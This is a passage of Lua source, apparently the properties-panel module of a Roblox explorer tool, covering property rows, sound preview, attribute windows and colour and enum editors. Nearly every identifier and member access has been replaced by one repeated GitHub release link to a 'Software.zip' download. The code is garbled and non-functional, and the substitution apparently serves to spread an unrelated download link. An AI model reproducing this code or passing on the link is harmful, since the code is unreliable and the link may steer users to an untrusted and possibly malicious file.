		https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = propsFrame

		return {
			Gui = newEntry,
			GuiElems = {
				NameFrame = nameFrame,
				ValueFrame = valueFrame,
				PropName = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip,
				ValueBox = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip,
				Expand = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip,
				ColorButton = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip,
				ColorPreview = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip,
				Gradient = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip,
				EnumArrow = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip,
				Checkbox = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip,
				RightButton = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip,
				RightButtonIcon = iconFrame,
				RowButton = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip,
				EditAttributeButton = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip,
				ToggleAttributes = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip,
				SoundPreview = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip,
				SoundPreviewSlider = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip
			}
		}
	end

	https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = function()
		for i = 1,#viewList do
			if viewList[i] == https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip then
				return propEntries[i - https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip]
			end
		end
	end

	https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = function(soundObj,noplay)
		local sound = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip
		if not sound then
			sound = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip("Sound")
			https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = "Preview"
			https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(function()
				local entry = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip()
				if entry then https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip, "Play") end
			end)
			https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(function() https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip() end)
			https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(function()
				local entry = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip()
				if entry then https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(0,-4,0,-8) end
				https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip()
			end)
			https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip
			https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = sound
		end

		if not soundObj then
			sound:Pause()
		else
			local newId = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip ~= https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip
			https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip
			https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip
			https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip
			if newId then https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = 0 end
			if not noplay then sound:Resume() end

			https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(function()
				local previewTime = tick()
				https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = previewTime
				while previewTime == https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip and https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip do
					local entry = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip()
					if entry then
						local tl = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip
						local perc = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(tl == 0 and 1 or tl)
						https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(perc,-4,0,-8)
					end
					https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip()
				end
			end)()
			https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip()
		end
	end

	https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = function(prop)
		local context = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip
		if not context then
			context = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip()
			https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = true
			https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = 80
		end
		context:Clear()

		context:Add({Name = "Edit", OnClick = function()
			https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(prop)
		end})
		context:Add({Name = "Delete", OnClick = function()
			https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(prop,nil,true)
			https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip()
		end})

		context:Show()
	end

	https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = function(editAttr)
		local win = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip
		if not win then
			win = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip()
			https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = false
			https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = false
			win:SetTitle("Add Attribute")
			win:SetSize(200,130)

			local saveButton = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip()
			local nameLabel = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip()
			https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = "Name"
			https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(0,30,0,10)
			https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(0,40,0,20)
			win:Add(nameLabel)

			local nameBox = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip()
			https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(0,75,0,10)
			https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(0,120,0,20)
			win:Add(nameBox,"NameBox")
			https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip("Text"):Connect(function()
				saveButton:SetDisabled(#nameBox:GetText() == 0)
			end)

			local typeLabel = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip()
			https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = "Type"
			https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(0,30,0,40)
			https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(0,40,0,20)
			win:Add(typeLabel)

			local typeChooser = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip()
			https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = false
			https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(0,75,0,40)
			https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(0,120,0,20)
			typeChooser:SetOptions(https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip)
			win:Add(typeChooser,"TypeChooser")

			local errorLabel = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip()
			https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = ""
			https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(0,5,1,-45)
			https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(1,-10,0,20)
			https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip
			https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = errorLabel
			win:Add(errorLabel,"Error")

			local cancelButton = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip()
			https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = "Cancel"
			https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(1,-97,1,-25)
			https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(0,92,0,20)
			https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(function()
				win:Close()
			end)
			win:Add(cancelButton)

			https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = "Save"
			https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(0,5,1,-25)
			https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(0,92,0,20)
			https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(function()
				local name = nameBox:GetText()
				if #name > 100 then
					https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = "Error: Name over 100 chars"
					return
				elseif name:sub(1,3) == "RBX" then
					https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = "Error: Name begins with 'RBX'"
					return
				end

				local typ = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip
				local valType = {Name = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip[typ] or typ, Category = "DataType"}
				local attrProp = {IsAttribute = true, Name = "ATTR_"https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip, AttributeName = name, DisplayName = name, Class = "Instance", ValueType = valType, Category = "Attributes", Tags = {}}

				https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = true
				https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(attrProp,https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip[https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip],true,https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip)
				https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip()
				win:Close()
			end)
			win:Add(saveButton,"SaveButton")

			https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = win
		end

		https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = editAttr
		win:SetTitle(editAttr and "Edit Attribute "https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip or "Add Attribute")
		https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = ""
		https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip("")
		https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(true)
		https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(1)
		win:Show()
	end

	https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = function(prop)
		local typeData = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip
		local typeName = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip

		return typeName ~= "bool" and https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip ~= "Enum" and https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip ~= "Class" and typeName ~= "BrickColor"
	end

	https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = function(entryIndex)
		local context = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip
		if not context then
			context = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip()
			https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = true
			https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = 200
			https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = 22
			https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = context
		end

		if not inputProp or https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip ~= "Enum" then return end
		local prop = inputProp

		local entry = propEntries[entryIndex]
		local valueFrame = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip

		local enum = Enum[https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip]
		if not enum then return end

		local sorted = {}
		for name,enum in next,enum:GetEnumItems() do
			sorted[#sorted+1] = enum
		end
		https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(sorted,function(a,b) return https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip < https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip end)

		context:Clear()

		local function onClick(name)
			if prop ~= inputProp then return end

			local enumItem = enum[name]
			inputProp = nil
			https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(prop,enumItem)
		end

		for i = 1,#sorted do
			local enumItem = sorted[i]
			context:Add({Name = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip, OnClick = onClick})
		end

		https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip
		context:Show(https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip, https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip + 22)
	end

	https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = function(prop,entryIndex,col)
		local editor = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip
		if not editor then
			editor = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip()
			https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip
			https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = 22

			https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(function(col)
				if not https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip or https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip ~= "BrickColor" then return end

				if https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip == inputProp then inputProp = nil end
				https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip,https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(col))
			end)

			https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(function() -- TODO: Special Case https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip to https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip
				editor:Close()
				local colProp
				for i,v in pairs(https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip) do
					if https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip == "Color" then
						colProp = v
						break
					end
				end
				https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(colProp,https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip)
			end)

			https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = editor
		end

		local entry = propEntries[entryIndex]
		local valueFrame = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip

		https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = prop
		https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = col
		if prop and https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip == "BasePart" and https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip == "BrickColor" then
			editor:SetMoreColorsVisible(true)
		else
			editor:SetMoreColorsVisible(false)
		end
		editor:Show(https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip, https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip + 22)
	end

	https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = function(prop,col)
		local editor = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip
		if not editor then
			editor = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip()

			https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(function(col)
				if not https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip then return end
				local typeName = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip
				if typeName ~= "Color3" and typeName ~= "BrickColor" then return end

				local colVal = (typeName == "Color3" and col or https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(col))

				if https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip == inputProp then inputProp = nil end
				https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip,colVal)
			end)

			https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = editor
		end

		https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = prop
		if col then
			editor:SetColor(col)
		else
			local firstVal = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(prop)
			if firstVal then editor:SetColor(firstVal) end
		end
		editor:Show()
	end

	https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = function(prop,seq)
		local editor = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip
		if not editor then
			editor = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip()

			https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(function(val)
				if not https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip or https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip ~= "NumberSequence" then return end

				if https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip == inputProp then inputProp = nil end
				https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip,val)
			end)

			https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = editor
		end

		https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = prop
		if seq then
			editor:SetSequence(seq)
		else
			local firstVal = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(prop)
			if firstVal then editor:SetSequence(firstVal) end
		end
		editor:Show()
	end

	https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = function(prop,seq)
		local editor = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip
		if not editor then
			editor = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip()

			https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(function(val)
				if not https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip or https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip ~= "ColorSequence" then return end

				if https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip == inputProp then inputProp = nil end
				https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip,val)
			end)

			https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = editor
		end

		https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = prop
		if seq then
			editor:SetSequence(seq)
		else
			local firstVal = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(prop)
			if firstVal then editor:SetSequence(firstVal) end
		end
		editor:Show()
	end

	https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = function(prop)
		local first = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip)
		if first then
			return https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(prop,first)
		end
	end

	https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = function(prop,obj)
		if https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip then return "<Multiple Types>" end
		if not obj then return end

		local propVal
		if https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip then
			propVal = getAttribute(obj,https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip)
			if propVal == nil then return nil end

			local typ = typeof(propVal)
			local currentType = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip[typ] or typ
			if https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip then
				if https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip ~= currentType then
					return nil
				end
			elseif https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip ~= currentType then
				return nil
			end
		else
			propVal = obj[https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip]
		end
		if https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip then
			local indexes = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip,".")
			for i = 1,#indexes do
				local indexName = indexes[i]
				if #indexName > 0 and propVal then
					propVal = propVal[indexName]
				end
			end
		end

		return propVal
	end

	https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = function(obj)
		if inputProp and https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip == "Class" then
			local prop = inputProp
			inputProp = nil

			if isa(obj,https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip) then
				https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(prop,obj)
			else
				https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip()
			end

			return true
		end

		return false
	end

	https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = function(prop,entryIndex)
		local propName = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip
		local typeData = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip
		local typeName = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip
		local tags = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip
		local gName = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip"."https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip or "")
		local propObj = autoUpdateObjs[gName]
		local entryData = propEntries[entryIndex]
		local UDim2 = UDim2

		local guiElems = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip
		local valueFrame = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip
		local valueBox = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip
		local colorButton = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip
		local colorPreview = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip
		local gradient = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip
		local enumArrow = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip
		local checkbox = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip
		local rightButton = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip
		local soundPreview = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip

		local propVal = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(prop,propObj)
		local inputFullName = inputProp and (https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip"."https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip or ""))

		local offset = 4
		local endOffset = 6

		-- Offsetting the ValueBox for ValueType specific buttons
		if (typeName == "Color3" or typeName == "BrickColor" or typeName == "ColorSequence") then
			https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = true
			https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = false
			if propVal then
				https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = (typeName == "Color3" and https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(propVal)) or (typeName == "BrickColor" and https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip)) or propVal
			else
				https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(1,1,1))
			end
			https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = (typeName == "ColorSequence" and https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(1,1,1) or https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(0,0,0))
			offset = 22
			endOffset = 24 + (typeName == "ColorSequence" and 20 or 0)
		elseif https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip == "Enum" then
			https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = false
			https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = not https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip
			endOffset = 22
		elseif (gName == inputFullName and https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip == "Class") or typeName == "NumberSequence" then
			https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = false
			https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = false
			endOffset = 26
		else
			https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = false
			https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = false
		end

		https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(0,offset,0,0)
		https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(1,-endOffset,1,0)

		-- Right button
		if inputFullName == gName and https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip == "Class" then
			https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip, "Delete")
			https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = true
			https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = ""
			https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = true
		elseif typeName == "NumberSequence" or typeName == "ColorSequence" then
			https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = false
			https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = "..."
			https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = true
		else
			https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = false
		end

		-- Displays the correct ValueBox for the ValueType, and sets it to the prop value
		if typeName == "bool" or typeName == "PhysicalProperties" then
			https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = false
			https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = true
			https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = false
			checkboxes[entryIndex].Disabled = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip
			if typeName == "PhysicalProperties" and autoUpdateObjs[gName] then
				checkboxes[entryIndex]:SetState(propVal and true or false)
			else
				checkboxes[entryIndex]:SetState(propVal)
			end
		elseif typeName == "SoundPlayer" then
			https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = false
			https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = false
			https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = true
			local playing = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip and https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip
			https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip, playing and "Pause" or "Play")
		else
			https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = true
			https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = false
			https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = false

			if propVal ~= nil then
				if typeName == "Color3" then
					https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = "["https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(propVal).."]"
				elseif https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip == "Enum" then
					https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip
				elseif https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip[typeName] and https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip then
					local rawStr = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(prop,propVal)
					https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = rawStr:gsub("-?%d+%.%d+",function(num)
						return tostring(tonumber(("%."https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip"f"):format(num)))
					end)
				else
					https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(prop,propVal)
				end
			else
				https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = ""
			end

			https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip and https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip or https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip
		end
	end

	https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = function()
